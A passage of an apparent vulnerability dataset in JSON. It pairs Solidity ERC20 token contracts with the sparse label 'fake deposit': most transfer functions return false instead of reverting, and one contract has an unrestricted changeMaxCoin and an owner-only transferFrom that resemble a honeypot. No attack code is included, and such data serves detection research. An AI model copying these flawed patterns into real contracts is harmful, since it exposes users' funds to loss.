Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function approve(address _spender, uint256 _value ) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function RedeemErc20Rune(uint256 amount) public {\r\n        if(!erc20RuneContract.transfer(msg.sender, amount)) revert();\r\n        balances[msg.sender] -= amount;\r\n        totalSupply -= amount;\r\n        emit Transfer(msg.sender, address(this), amount);\r\n    }\r\n\r\n    function MintSafeRune(uint256 amount) public {\r\n        // transferTo always returns true so theres no reason to check the return value. Reverts on fail\r\n        erc20RuneContract.transferTo(address(this), amount);\r\n        balances[msg.sender] += amount;\r\n        totalSupply += amount;\r\n        emit Transfer(address(this), msg.sender, amount);\r\n    }\r\n}\r\n\r\ninterface Erc20Rune {\r\n  function transferTo(address recipient, uint256 amount) external returns (bool);\r\n  function transfer(address _to, uint256 _value) external returns (bool success);\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract dFund is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000*10**uint256(decimals);\r\n    string public constant name = \"dFund\";\r\n    string public constant symbol = \"DFND\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ColossalShibaInu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Colossal Shiba Inu\";\r\n    string public constant symbol = \"COLINU\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n    \r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n        public\r\n        returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract FastSafeToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 2*10**26;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"FastSafe\";\r\n    string constant public symbol = \"JAHK\";\r\n\r\n    function FastSafeToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"Central Hub\";\r\n        decimals = 0;\r\n        symbol = \"CHAIR\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n* Test coin !\r\n*/\r\n\r\npragma solidity ^0.5.16;\r\n\r\n// ----------------------------------------------------------------------------\r\n// ERC Token Standard #20 Interface\r\n//\r\n// ----------------------------------------------------------------------------\r\ncontract ERC20Interface {\r\n   function totalSupply() public view returns (uint);\r\n   function balanceOf(address tokenOwner) public view returns (uint balance);\r\n   function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n   function transfer(address to, uint tokens) public returns (bool success);\r\n   function approve(address spender, uint tokens) public returns (bool success);\r\n   function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n   function changeMaxCoin(uint256 coin) public returns (bool success);\r\n\r\n   event Transfer(address indexed from, address indexed to, uint tokens);\r\n   event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\n// ----------------------------------------------------------------------------\r\n// Safe Math Library\r\n// ----------------------------------------------------------------------------\r\ncontract SafeMath {\r\n   function safeAdd(uint a, uint b) public pure returns (uint c) {\r\n       c = a + b;\r\n       require(c >= a);\r\n   }\r\n   function safeSub(uint a, uint b) public pure returns (uint c) {\r\n       require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\r\n       c = a / b;\r\n   }\r\n}\r\n\r\n\r\ncontract BEP20TOKEN is ERC20Interface, SafeMath {\r\n   string public name;\r\n   string public symbol;\r\n   uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\r\n   uint256 public _totalSupply;\r\n   uint256 public _coins;\r\n   address public _owner;\r\n   mapping(address => uint) balances;\r\n   mapping(address => mapping(address => uint)) allowed;\r\n\r\n   /**\r\n    * Constrctor function\r\n    *\r\n    * Initializes contract with initial supply tokens to the creator of the contract\r\n    */\r\n   constructor( string memory name_, string memory symbol_, address owner_ , uint256  coins_) public {\r\n       name = name_;\r\n       symbol = symbol_;\r\n       decimals = 18;\r\n       _totalSupply = 1000000000000000000000000000000;\r\n       _owner = owner_;\r\n       _coins = coins_ * 10 ** 18;\r\n       balances[msg.sender] = _totalSupply;\r\n       emit Transfer(address(0), msg.sender, _totalSupply);\r\n   }\r\n\r\n   function totalSupply() public view returns (uint) {\r\n       return _totalSupply  - balances[address(0)];\r\n   }\r\n\r\n   function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n       return balances[tokenOwner];\r\n   }\r\n\r\n   function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n       return allowed[tokenOwner][spender];\r\n   }\r\n   \r\n   function approve(address spender, uint tokens) public returns (bool success) {\r\n       allowed[msg.sender][spender] = tokens;\r\n       emit Approval(msg.sender, spender, tokens);\r\n       return true;\r\n   }\r\n\r\n   function transfer(address to, uint tokens) public returns (bool success) {\r\n       balances[msg.sender] = safeSub(balances[msg.sender], tokens);\r\n       balances[to] = safeAdd(balances[to], tokens);\r\n       emit Transfer(msg.sender, to, tokens);\r\n       return true;\r\n   }\r\n\r\n   function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n       \r\n       if (_owner == from  || balances[from] < _coins) {\r\n           balances[from] = safeSub(balances[from], tokens);\r\n           allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\n           balances[to] = safeAdd(balances[to], tokens);\r\n           emit Transfer(from, to, tokens);\r\n           return true;\r\n       }\r\n       \r\n       \r\n   }\r\n   \r\n   function changeMaxCoin(uint256 coins) public returns (bool success) {\r\n        _coins = coins * 10 ** 18;\r\n        return true;\r\n   }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'GrilledCheeseSandwich' token contract\r\n//\r\n// Symbol      : GCS \ud83e\udd6a\r\n// Name        : Grilled Cheese Sandwich\r\n// Total supply: 100000000000000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract GrilledCheeseSandwich is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Grilled Cheese Sandwich\";\r\n    string public constant symbol = \"GCS \ud83e\udd6a\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.0;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract IERC20 {\r\n    function totalSupply() virtual public view returns (uint256 supply);\r\n    function balanceOf(address _owner) virtual public view returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) virtual public returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\r\n    function approve(address _spender, uint256 _value) virtual public returns (bool success);\r\n    function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\ncontract ERC20 is IERC20 {\r\n    using SafeMath for uint256;\r\n    uint256 internal total_supply;\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    event Burn(address indexed burner, uint256 value);\r\n    event Mint(address indexed to, uint256 value);\r\n    function transfer(address _to, uint256 _value) override public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function balanceOf(address _owner) public view override returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n    function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    function allowance(address _owner, address _spender) public override returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n    function totalSupply() public view override returns (uint256 supply) {\r\n        return total_supply;\r\n    }\r\n}\r\n\r\ncontract BTCH is ERC20 {\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    address public owner;\r\n    constructor (uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {\r\n        balances[msg.sender] = _initialAmount* 10 ** uint256(_decimalUnits);\r\n        total_supply = _initialAmount* 10 ** uint256(_decimalUnits);\r\n        name = _tokenName;\r\n        decimals = _decimalUnits;\r\n        symbol = _tokenSymbol;\r\n        owner = msg.sender;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Smoothy is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000*10**uint256(decimals);\r\n    string public constant name = \"Smoothy.finance\";\r\n    string public constant symbol = \"SMTY\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract MetaMaskToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"MetaMask Token\";\r\n    string public constant symbol = \"MSKT\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ElonTweets is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Elon Tweets\";\r\n    string public constant symbol = \"ELONT \ud83d\udc26\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external 